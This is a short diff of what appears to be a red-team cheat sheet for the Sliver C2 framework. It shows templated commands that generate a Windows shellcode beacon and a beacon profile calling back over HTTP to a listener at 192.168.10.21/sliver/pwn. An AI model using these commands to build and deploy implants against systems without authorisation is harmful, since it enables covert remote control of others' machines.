@@ -33,3 +33,4 @@ generate beacon --<beacon_interval_unit|seconds> <beacon_interval|30> --jitter <
 ```bash
  profiles new beacon --<beacon_interval_unit|seconds> <beacon_interval|30> --jitter <beacon_interval_jitter|3> --os <beacon_os|windows> --arch <beacon_arch|amd64> --format <beacon_format|shellcode> --skip-symbols --http  <beacon_connect_string|http://192.168.10.21:80/sliver/pwn> <beacon_profile_name>
 ```
+
